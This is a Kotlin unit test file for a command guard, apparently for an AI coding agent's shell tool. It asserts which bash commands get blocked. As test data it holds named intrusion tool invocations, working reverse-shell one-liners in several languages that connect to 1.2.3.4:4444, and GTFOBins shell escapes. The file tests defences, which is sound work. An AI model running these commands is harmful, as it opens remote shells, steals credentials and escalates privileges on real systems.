package dev.lain.claudejb.permission

import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.put
import org.junit.jupiter.api.Assertions.assertEquals
import org.junit.jupiter.api.Assertions.assertNotEquals
import org.junit.jupiter.api.Test

class IntrusionTechniqueTest {

    private val policy = SensitiveGuard.Policy(
        globs = CredentialPaths.SENSITIVE_GLOBS,
        home = "/home/me",
        currentUser = "me",
        projectRoot = "/home/me/proj",
    )

    private fun bash(cmd: String) = buildJsonObject { put("command", cmd) }
    private fun ruleFor(cmd: String) = SensitiveGuard.evaluate(bash(cmd), policy).rule
    private fun verdictFor(cmd: String) = SensitiveGuard.evaluate(bash(cmd), policy).verdict

    private fun blockedBy(rule: SecurityRule, vararg commands: String) = commands.forEach {
        assertEquals(SensitiveGuard.Verdict.DENY, verdictFor(it), it)
        assertEquals(rule, ruleFor(it), "'$it' tripped the wrong rule")
    }

    private fun notFlaggedAs(rule: SecurityRule, vararg commands: String) = commands.forEach {
        assertNotEquals(rule, ruleFor(it), it)
    }

    @Test
    fun `named intrusion tools are blocked as HACKING_TOOL, across the kill chain`() {
        blockedBy(
            SecurityRule.HACKING_TOOL,
            "mimikatz",
            "sudo lazagne all",
            "impacket-secretsdump domain/user@host",
            "responder -I eth0",
            "nmap -sS 10.0.0.0/24",
            "ffuf -u http://x/FUZZ -w list.txt",
            "sqlmap -u http://x?id=1 --dbs",
            "msfvenom -p linux/x64/shell_reverse_tcp",
            "rubeus asktgt /user:x",
            "certipy find -u x -p y",
            "crackmapexec smb 10.0.0.0/24",
            "/opt/tools/sliver-server",
            "hashcat -m 1000 hashes.txt",
            "linpeas.sh",
            "pacu",
        )
    }

    @Test
    fun `an obfuscated tool name is still caught`() {
        blockedBy(
            SecurityRule.HACKING_TOOL,
            "n\"\"map -sS 10.0.0.1",
            "sud\"\"o mimikatz",
        )
    }

    @Test
    fun `a tool NAME merely mentioned, not run, is not flagged`() {
        notFlaggedAs(
            SecurityRule.HACKING_TOOL,
            "git commit -m 'add nmap output parser'",
            "cat sqlmap-notes.md",
            "ls /home/me/proj/hydra-config",
            "echo 'the responder pattern'",
        )
    }

    @Test
    fun `reverse shells are caught whatever language carries them`() {
        listOf(
            "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"1.2.3.4\",4444));os.dup2(s.fileno(),0);subprocess.call([\"/bin/sh\"])'",
            "perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,0);exec(\"/bin/sh -i\");'",
            "php -r '\$s=fsockopen(\"1.2.3.4\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"1.2.3.4\",4444);loop{c.puts `sh`}'",
            "socat exec:'bash -li',pty,stderr tcp:1.2.3.4:4444",
            "mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 1.2.3.4 4444 > /tmp/f",
            "awk 'BEGIN{s=\"/inet/tcp/0/1.2.3.4/4444\";while(1){}}'",
        ).forEach {
            assertNotEquals(SensitiveGuard.Verdict.ALLOW, verdictFor(it), it)
        }
        blockedBy(
            SecurityRule.REVERSE_SHELL,
            "powershell -c \"\$c=New-Object System.Net.Sockets.TCPClient('1.2.3.4',4444)\"",
        )
    }

    @Test
    fun `ordinary socket and network work is not a reverse shell`() {
        notFlaggedAs(
            SecurityRule.REVERSE_SHELL,
            "python3 -c 'import socket; print(socket.gethostname())'",
            "node -e 'require(\"http\").get(\"http://api.example.com\")'",
            "curl -s https://api.example.com/health",
            "nc -z localhost 8080",
            "php -r 'echo 1+1;'",
        )
    }

    @Test
    fun `GTFOBins shell escapes are caught`() {
        blockedBy(
            SecurityRule.PRIVESC_EXEC,
            "find . -exec /bin/sh \\;",
            "find /etc -execdir bash \\;",
            "vim -c ':!/bin/sh'",
            "awk 'BEGIN{system(\"/bin/sh\")}'",
            "tar cf /dev/null x --checkpoint=1 --checkpoint-action=exec=/bin/sh",
            "env /bin/sh",
            "xargs -a /dev/null sh",
            "sudo find . -exec /bin/bash \\;",
        )
    }

    @Test
    fun `ordinary use of those same binaries keeps working`() {
        notFlaggedAs(
            SecurityRule.PRIVESC_EXEC,
            "find . -name '*.kt' -exec grep -l TODO {} \\;",
            "find src -type f -delete",
            "vim src/App.kt",
            "awk '{print \$1}' data.csv",
            "tar czf out.tar.gz src/",
            "env NODE_ENV=test npm test",
            "ls | xargs rm -f",
            "git log --oneline -5",
            "sed -i 's/a/b/' f",
        )
    }
}
